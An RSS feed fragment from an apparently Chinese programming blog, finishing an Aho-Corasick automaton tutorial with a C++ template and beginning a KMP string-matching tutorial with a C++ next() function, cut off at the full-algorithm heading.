&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdn.net/20181006092859165?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Jlc3Rzb3J0/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;现在第一层 bfs 遍历完了，开始第二层&lt;br /&gt;
 (根节点为第 0 层) 第二层 a 的子节点为 s, 但是我们还是要从 a-z 遍历，如果不存在这个子节点我们就让他指向根节点 (如下图红色的 a)&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdn.net/20181006093044472?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Jlc3Rzb3J0/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;当我们遍历到 s 的时候，由于存在 s 这个节点，我们就让他的 fail 指针指向他父亲节点 (a) 的 fail 指针指向的那个节点 (根) 的具有相同字母的子节点 (第一层的 s), 也就是这样&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdn.net/20181006093334238?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Jlc3Rzb3J0/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;按照相同规律构建第二层后，到了第三层的 h 点，还是按照上面的规则，我们找到 h 的父亲节点 (s) fail 指针指向的那个位置 (第一层的 s) 然后指向它所指向的相同字母根 -&amp;gt;s-&amp;gt;h 的这个链的 h 节点，如下图&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdn.net/20181006093412877?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Jlc3Rzb3J0/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;完全构造好后的树&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdn.net/2018100609362045?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Jlc3Rzb3J0/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;然后匹配就很简单了，这里以 ashe 为例&lt;br /&gt;
我们先用 ash 匹配，到 h 了发现：诶这里 ash 是一个完整的模式串，好的 ans++, 然后找下一个 e, 可是 ash 后面没字母了啊，我们就跳到 hfail 指针指向的那个 h 继续找，还是没有？再跳，结果当前的 h 指向的是根节点，又从根节点找，然而还是没有找到 e, 程序 END&lt;/p&gt;
&lt;p&gt;过程如下图&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdn.net/20181006093706548?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Jlc3Rzb3J0/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;喜闻乐见模板系列&lt;br /&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;queue&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;cstdlib&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;cmath&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;cstdio&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;string&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;cstring&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;algorithm&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;using namespace std;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;typedef long long ll;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;const int maxn =  2*1e6+9;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int trie[maxn][26]; //字典树&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int cntword[maxn];  //记录该单词出现次数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int fail[maxn];     //失败时的回溯指针&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int cnt = 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;void insertWords(string s)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int root = 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for(int i=0;i&amp;lt;s.size();i++)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        int next = s[i] - &amp;#x27;a&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if(!trie[root][next])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            trie[root][next] = ++cnt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        root = trie[root][next];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cntword[root]++;      //当前节点单词数+1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;void getFail()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    queue &amp;lt;int&amp;gt;q;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for(int i=0;i&amp;lt;26;i++)&amp;#123;      //将第二层所有出现了的字母扔进队列&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if(trie[0][i])&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            fail[trie[0][i]] = 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            q.push(trie[0][i]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//fail[now]    -&amp;gt;当前节点now的失败指针指向的地方&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tire[now][i] -&amp;gt; 下一个字母为i+&amp;#x27;a&amp;#x27;的节点的下标为tire[now][i]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    while(!q.empty())&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        int now = q.front();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        q.pop();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        for(int i=0;i&amp;lt;26;i++)&amp;#123;      //查询26个字母&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            if(trie[now][i])&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                //如果有这个子节点为字母i+&amp;#x27;a&amp;#x27;,则&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//让这个节点的失败指针指向(((他父亲节点)的失败指针所指向的那个节点)的下一个节点)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                //有点绕,为了方便理解特意加了括号&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                fail[trie[now][i]] = trie[fail[now]][i];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                q.push(trie[now][i]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            else//否则就让当前节点的这个子节点&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                //指向当前节点fail指针的这个子节点&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                trie[now][i] = trie[fail[now]][i];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int query(string s)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int now = 0,ans = 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for(int i=0;i&amp;lt;s.size();i++)&amp;#123;    //遍历文本串&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        now = trie[now][s[i]-&amp;#x27;a&amp;#x27;];  //从s[i]点开始寻找&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        for(int j=now;j &amp;amp;&amp;amp; cntword[j]!=-1;j=fail[j])&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            //一直向下寻找,直到匹配失败(失败指针指向根或者当前节点已找过).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            ans += cntword[j];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            cntword[j] = -1;    //将遍历国后的节点标记,防止重复计算&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return ans;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int main() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int n;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    string s;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cin &amp;gt;&amp;gt; n;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for(int i=0;i&amp;lt;n;i++)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        cin &amp;gt;&amp;gt; s ;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        insertWords(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    fail[0] = 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    getFail();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cin &amp;gt;&amp;gt; s ;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cout &amp;lt;&amp;lt; query(s) &amp;lt;&amp;lt; endl;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mangpumo.github.io/2023/01/14/CPP%E7%9A%84KMP%E7%AE%97%E6%B3%95/</guid>
            <title>CPP的KMP算法</title>
            <link>https://mangpumo.github.io/2023/01/14/CPP%E7%9A%84KMP%E7%AE%97%E6%B3%95/</link>
            <pubDate>Sat, 14 Jan 2023 03:50:50 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;1kmp算法简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1kmp算法简介&#34;&gt;#&lt;/a&gt; 1.kmp 算法简介&lt;/h1&gt;
&lt;p&gt;KMP 是三位大牛：D.E.Knuth、J.H.Morris 和 V.R.Pratt 同时发现的。&lt;br /&gt;
KMP 算法其实就是一种改进的字符串匹配算法，关键是利用匹配后失败的信息，尽量减少模式串（W）与主串（T）的匹配次数以达到快速匹配的目的。具体实现就是实现一个 next () 函数，函数本身包含了模式串的局部匹配信息。时间复杂度 O (m+n)。&lt;br /&gt;
如果考虑最笨的方法，我们可以将 T [0] 和 W [0] 进行匹配，如果相同则匹配下一个字符，直到出现不相同的情况，此时我们会丢弃前面的匹配信息，然后把 T [1] 跟 W [0] 匹配，循环进行，直到主串结束，或者出现匹配成功的情况。这种丢弃前面的匹配信息的方法，时间复杂度为 O (m*n)。&lt;br /&gt;
KMP 算法利用已经部分匹配这个有效信息，保持 i 指针（主串）不回溯，通过修改 j 指针，让模式串尽量地移动到有效的位置，具体可见下面一个例子。&lt;br /&gt;
如果主串为：a b c a b c d h i j k&lt;br /&gt;
 模式串为：a b c e&lt;br /&gt;
 当我们匹配到主串的第四个字符 a 时，可知 a 和 e 不相等，因此需要移向下一位，但其实我们并不需要从模式串中的第一位重新开始比较，因为主串中的前三个字符已经没有未匹配的 a 了，不可能匹配成功。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2018/01/30/5a706e671dc4d.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;2next函数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2next函数&#34;&gt;#&lt;/a&gt; 2.next（）函数&lt;/h1&gt;
&lt;p&gt;因此，最关键的是找到如何移动 j 指针。我们记当匹配失败时，j 要移动的下一个位置为 k（即 next [j]= k)。记 P 为模式串。&lt;br /&gt;
很显然，存在这样一个性质：最前面的 k 个位置（对于模式串来说）和 j 之前的最后 k 个字符（主串）是一样的。因此得到公式：&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;P[0 ~ k-1] == P[j-k ~ j-1]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;当 P [k] == p [j] 时&lt;/p&gt;
&lt;p&gt;有 P [0 ~ k-1] + P [k] == p [j-k ~ j-1] + P [j]，即：P [0 ~ k] == P [j-k ~ j]，因此可得&lt;br /&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;next[j+1] == k + 1 == next[j] + 1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;当 P [k] != p [j] 时&lt;/p&gt;
&lt;p&gt;我们只能在 0~k-1 中去寻找最长后缀串了，因此为&lt;br /&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;k = next[k]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;使用 C++ 实现 next 函数为&lt;br /&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;int* getNext(string p)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int* next = new int[p.length()];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    next[0] = -1;           //while the first char not match, i++,j++&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int j = 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int k = -1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    while (j &amp;lt; (int)p.length() - 1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if (k == -1 || p[j] == p[k])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            j++;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            k++;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            next[j] = k;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        else&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            k = next[k];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return next;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h1 id=&#34;3完整算法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3完整算法&#34;&gt;#&lt;/a&gt; 3. 完整算法&lt;/h1&gt;
